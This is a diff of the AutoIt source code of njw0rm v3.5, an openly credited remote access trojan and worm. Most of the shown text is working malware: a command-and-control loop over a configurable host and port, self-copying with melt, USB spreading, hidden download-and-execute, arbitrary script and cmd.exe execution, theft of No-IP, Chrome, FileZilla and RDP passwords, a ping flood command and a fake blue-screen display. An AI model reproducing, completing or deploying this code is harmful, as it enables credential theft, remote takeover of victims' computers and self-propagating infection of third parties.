@@ -1,12 +1,16 @@
 #comments-start
+
 njw0rm  : v3.5
 Write By: njq8 + Mr.Mobark
 T = @njq8 + F = HK Dark
 Last Update: 2013/7/10
+
 #comments-end
 
 #NoTrayIcon
+
 #INCLUDE <WINAPI.AU3>
+
 #include <WindowsConstants.au3>
 #include <GUIConstantsEx.au3>
 #include <Misc.au3>
@@ -16,23 +20,31 @@ Last Update: 2013/7/10
 #include <SQLite.au3>
 #include <SQLite.dll.au3>
 #include <Process.au3>
+
 Opt("RunErrorsFatal", 0)
+
 Local $Host =  "<host>"
 Local $PORT = <port>
 Local $EXE  = "<exe>"
 Local $DIR  = EnvGet("<dir>") & "\"
 Local $VR  = "3.5"
 Local $name  =  "<name>"
+
 $name &=   "_" & Hex( driveGetSerial( @HomeDrive))
+
 $OS=    @OSVersion & " "& @OSArch  & " " & StringReplace( @OSServicePack,"Service Pack ","SP")
+
 if StringInStr( $OS,"SP")<1 then $OS &="SP0"
+
 Local $USB  =  "!"
 cusb()
+
 $melt="<melt>"
 $Y="0njxq80"
 $MTX ="<mtx>"
 $TIMER=0
 $fh=-1
+
 if $cmdline[0]=2 Then ; check cmdline for melt
    Select
 	case  $cmdline[1]= "del"
@@ -41,8 +53,10 @@ if $cmdline[0]=2 Then ; check cmdline for melt
     endif
    EndSelect
 endif
+
 Sleep( @AutoItPID /10)
 If _Singleton($MTX , 1) = 0 Then
+
     Exit
 EndIf
 if @AutoItExe <> $dir & $exe Then ; check if i need to copy
@@ -50,6 +64,7 @@ if @AutoItExe <> $dir & $exe Then ; check if i need to copy
 	ShellExecute( $dir & $exe ,"""del"" " & @AutoItExe)
 	Exit
  EndIf
+
 $mem=""
 $sock =-1
 bk()
@@ -59,6 +74,7 @@ usbx()
 $TIME=0
 $AC=""
 $EA=""
+
 While 1
    $TIME +=1
    if $TIME=5 Then
@@ -66,9 +82,12 @@ While 1
 	  ins()
 	  usb()
   EndIf
+
       if @error Then
    EndIf
+
  $PK =RC()
+
     if @error Then
    EndIf
 
@@ -76,9 +95,10 @@ While 1
 	case $pk=-1
 	Sleep(2000)
 	cn() ; if not connected then connect,, Call CN FUNC
-	sd("lv" & $Y & $name & $Y & K() & $Y & $os & $Y & $VR  & $Y & $USB & $Y & WinGetTitle(""))
- Case $pk="" ; if nothing recived..
 
+	sd("lv" & $Y & $name & $Y & K() & $Y & $os & $Y & $VR  & $Y & $USB & $Y & WinGetTitle(""))
+
+ Case $pk="" ; if nothing recived..
         $timer +=1
 
 		if $timer=8 Then
@@ -87,84 +107,106 @@ While 1
 		   if $EA<>$AC Then
 			   sd("ac" & $Y & $EA)
 			  EndIf
+
 	$AC = $EA
 	$EA=""
-		   endif
+	endif
+
  case $pk<>"" ; if there is packet process it..
 		 $A= StringSplit($PK,"0njxq80",1)
+
 	if $A[0]>0 Then
 	  Select
-		case $A[1]="DL"
 
+		case $A[1]="DL"
     InetGet($A[2], @TempDir & "\" & $A[3] ,1)
+
 	 if FileExists( @TempDir & "\" & $A[3]) Then
 		  	ShellExecute("cmd.exe",  "/c start %temp%\" & $A[3],"" ,"" ,@SW_HIDE)
 		sd("MSG" & $Y & "Executed As " & $A[3])
+
 	 Else
 		   sd("MSG" & $Y & "Download ERR")
      EndIf
+
    case $A[1]="up"; update
 	      InetGet($A[2], @TempDir & "\" & $A[3] ,1)
+
 	if FileExists( @TempDir & "\" & $A[3]) Then
 	   	ShellExecute("cmd.exe",  "/c start %temp%\" & $A[3],"" ,"" ,@SW_HIDE)
 		uns()
 	 EndIf
 	    sd("MSG" & $Y & "Update ERR")
+
 	case $A[1]="un" ; uninstall!
 	  uns()
+
    case $A[1]="ex" ; execute autoit script
 	  Execute( $A[2])
+
    case $A[1]="cmd"; execute cmd.exe
 	  ShellExecute("cmd.exe", $A[2],"","",@SW_HIDE)
+
    case $A[1]="pwd" ; get passwords
 	  sd("pas" & $Y & noip() & chrome() & FileZilla())
+
    case $A[1]="url"
      ShellExecute($A[2])
+
    case $A[1]="att"
     RunWait( @comspec & " /c ping "&$A[2]&" -l "&$A[2]&" -t","",@SW_HIDE)
+
    Case $A[1]="msg"
 	 MsgBox(0,$A[2],$A[3])
+
  Case $A[1]="scb"
-
 _WinAPI_ShowCursor(False)
-
 HotKeySet("{F8}", "ExitBlueScr")
-
 Global $DesktopWidth = @DesktopWidth, $DesktopHeight = @DesktopHeight
 Global $DesktopDepth = @DesktopDepth, $DesktopRefresh = @DesktopRefresh
 GUICreate("Bluescr", @DesktopWidth + 4, @DesktopHeight + 4)
 GUISetBkColor(0x0000A0)
+
 $Label = GUICtrlCreateLabel("A problem has been detected and Windows has been shut down to prevent damage" & @CRLF & _
 "to your computer." & @CRLF & _
 @CRLF & _
+
 "The problem seems to be caused by the following file: SPCMDCON.SYS" & @CRLF & _
 @CRLF & _
+
 "PAGE_FAULT_IN_NONPAGED_AREA" & @CRLF & _
 @CRLF & _
+
 "If this is the first time you've seen this stop error screen," & @CRLF & _
 "restart your computer. If this screen appears again, follow" & @CRLF & _
 "these steps:" & @CRLF & _
 @CRLF & _
+
 "Check to make sure any new hardware or software is properly installed." & @CRLF & _
 "If this is a new installation, ask your hardware or software manufacturer" & @CRLF & _
 "for any Windows updates you might need." & @CRLF & _
 @CRLF & _
+
 "If problems continue, disable or remove any newly installed hardware" & @CRLF & _
 "or software. Disable BIOS memory options such as caching or shadowing." & @CRLF & _
 "If you need to use Safe Mode to remove or disable components, restart" & @CRLF & _
 "your computer, press F8 to select Advanced Startup Options, and then" & @CRLF & _
 "select Safe Mode." & @CRLF & _
 @CRLF & _
+
 "Technical information:" & @CRLF & _
 @CRLF & _
+
 "*** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)" & @CRLF & _
 @CRLF & _
+
 @CRLF & _
 "***  SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c", 10, 10, @DesktopWidth - 10, @DesktopHeight - 10)
 GUICtrlSetFont(-1, 17, 100, -1, "Lucida Console")
 GUICtrlSetColor(-1, 0xD8D8D8)
 GUICtrlSetOnEvent(-1, "None")
 GUISetState()
+
 $iWidth = 1024
 $iHeight = 768
 $iBitsPP = 32
@@ -528,3 +570,4 @@ Func UncryptRDPPassword($bin)
     $PwdHash = DllStructCreate("byte[" & $len & "]", $PwdHash)
     Return BinaryToString(DllStructGetData($PwdHash, 1), 4)
 EndFunc
+
